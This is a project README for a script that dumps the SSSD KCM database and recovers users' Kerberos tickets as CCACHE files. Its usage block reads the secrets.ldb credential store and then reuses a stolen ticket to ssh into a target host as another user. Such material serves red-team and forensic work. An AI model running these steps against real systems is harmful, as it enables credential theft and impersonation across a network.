# KCM dumper

Quick script to dump the KCM database used by SSSD and recover Kerberos tickets
in the CCACHE format.

Initially based on
[SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor) and
[KCMTicketFormatter](https://github.com/blacklanternsecurity/KCMTicketFormatter).

## Description

Since [version 2.0.0](https://sssd.io/release-notes/sssd-2.0.0.html#new-features)
(2018-08-13), the back end storage of the KCM responder of SSSD does not
encrypt the database content anymore. It however still relies on an
[LDB](https://ldb.samba.org/) database (itself based on
[TDB](https://tdb.samba.org/)), which makes it easily searchable using
LDAP-like queries.

SSSD uses a custom storage format for Kerberos tickets, which can be converted
to standard CCACHE files using this script.

## Usage

```sh
$ apt install python3-construct python3-ldb
$ python3 kcmdump.py /var/lib/sss/secrets/secrets.ldb
$ ls -lh
-rw-r--r--. 1 root root 1.3K Jan 1 00:00 user_0.ccache
-rw-r--r--. 1 root root 1.8K Jan 1 00:00 kcmdump.py
$ KRB5CCNAME=user_0.ccache klist
$ KRB5CCNAME=user_0.ccache ssh user@corp.local@target.corp.local
```
